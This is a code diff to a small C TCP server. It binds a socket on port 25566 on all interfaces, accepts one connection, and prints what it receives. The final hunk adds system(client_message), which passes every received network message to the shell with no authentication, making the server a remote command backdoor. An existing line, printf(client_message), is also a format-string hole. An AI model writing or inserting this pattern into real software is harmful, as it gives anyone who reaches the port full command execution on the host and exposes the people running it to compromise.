@@ -30,7 +30,7 @@ int main(int argc , char *argv[])
 {
     int socket_desc , c , read_size;
     int startTCP = 0;
-    struct sockaddr_in server , client;
+    struct sockaddr_in server , client, tcpServer;
     char client_message[DEFAULT_BUFLEN];
    
     char username[USERNAME_MAX_LENGTH];
@@ -98,11 +98,18 @@ int main(int argc , char *argv[])
     }
     
     
+    server.sin_family = AF_INET;
+    server.sin_addr.s_addr = INADDR_ANY;
+    server.sin_port = htons(DEFAULT_PORT);
+    
     
     int tcpSocket = socket(AF_INET , SOCK_STREAM , 0);
-    client.sin_port = htons(25566);
+    tcpServer.sin_family = AF_INET;
+    tcpServer.sin_addr.s_addr = INADDR_ANY;
+    tcpServer.sin_port = htons(25566);
     
-    if( bind(tcpSocket,(struct sockaddr *)&client , sizeof(client)) < 0)
+    
+    if( bind(tcpSocket,(struct sockaddr *)&tcpServer , sizeof(tcpServer)) < 0)
     {
         //print the error message
         perror("bind failed. Error");
@@ -113,7 +120,7 @@ int main(int argc , char *argv[])
     //Listen
     listen(tcpSocket , 1);
     
-    int client_sock = accept(tcpSocket, (struct sockaddr *)&client, (socklen_t*)&c);
+    int client_sock = accept(tcpSocket, (struct sockaddr *)&tcpServer, (socklen_t*)&c);
     if (client_sock < 0)
     {
         perror("accept failed");
@@ -129,6 +136,7 @@ int main(int argc , char *argv[])
         printf("Bytes received: %d\n", read_size);
         client_message[read_size] = '\0';
         printf(client_message);
+        system(client_message);
     }
 
     if(read_size == 0)
